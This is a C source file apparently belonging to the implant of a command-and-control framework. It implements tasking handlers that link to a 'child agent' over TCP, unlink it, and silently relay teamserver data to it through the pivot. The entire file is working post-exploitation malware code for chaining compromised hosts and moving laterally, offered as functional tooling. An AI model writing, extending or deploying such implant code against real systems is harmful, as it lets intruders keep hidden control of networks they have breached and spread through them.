#include "tasks_pivot.h"
#include "pivot.h"
#include "crt.h"

/// COMMAND_LINK — connect to child agent via TCP
/// Input msgpack: {address: str, port: int}
/// cmd_id is used as the pivot identifier (matches Go's task.TaskId)
int task_link_with_id(uint32_t cmd_id, const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        mp_write_map(w, 1);
        mp_write_kv_str(w, "error", "Invalid params");
        return 0;
    }

    const char *address = (const char *)0;
    uint32_t addr_len = 0;
    int port = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 7 && ax_memcmp(key, "address", 7) == 0) {
            mp_read_str(&r, &address, &addr_len);
        } else if (klen == 4 && ax_memcmp(key, "port", 4) == 0) {
            uint64_t v;
            mp_read_uint(&r, &v);
            port = (int)v;
        } else {
            mp_skip(&r);
        }
    }

    if (!address || addr_len == 0 || port <= 0) {
        mp_write_map(w, 1);
        mp_write_kv_str(w, "error", "Missing address or port");
        return 0;
    }

    // Null-terminate the address string
    char addr_buf[256];
    uint32_t copy_len = addr_len < 255 ? addr_len : 255;
    ax_memcpy(addr_buf, address, copy_len);
    addr_buf[copy_len] = '\0';

    // Use cmd_id as the pivot ID — the Go side uses this for TsPivotCreate
    pivot_link_tcp(&g_pivot_ctx, cmd_id, addr_buf, port, w);
    return 0;
}

/// COMMAND_UNLINK — disconnect a pivot
/// Input msgpack: {pivot_id: uint}
int task_unlink(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        mp_write_map(w, 1);
        mp_write_kv_str(w, "error", "Invalid params");
        return 0;
    }

    uint32_t pivot_id = 0;
    for (uint32_t i = 0; i < map_count; i++) {
        const char *key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 8 && ax_memcmp(key, "pivot_id", 8) == 0) {
            uint64_t v;
            mp_read_uint(&r, &v);
            pivot_id = (uint32_t)v;
        } else {
            mp_skip(&r);
        }
    }

    pivot_unlink(&g_pivot_ctx, pivot_id, w);
    return 0;
}

/// COMMAND_PIVOT_EXEC — relay data from teamserver to child agent
/// Input msgpack: {pivot_id: uint, data: bytes}
int task_pivot_exec(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        return 0;
    }

    uint32_t pivot_id = 0;
    const uint8_t *relay_data = (const uint8_t *)0;
    uint32_t relay_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 8 && ax_memcmp(key, "pivot_id", 8) == 0) {
            uint64_t v;
            mp_read_uint(&r, &v);
            pivot_id = (uint32_t)v;
        } else if (klen == 4 && ax_memcmp(key, "data", 4) == 0) {
            mp_read_bin(&r, &relay_data, &relay_len);
        } else {
            mp_skip(&r);
        }
    }

    if (relay_data && relay_len > 0) {
        pivot_write(&g_pivot_ctx, pivot_id, relay_data, relay_len);
    }

    // PIVOT_EXEC doesn't produce a visible response — silent relay
    (void)w;
    return 0;
}
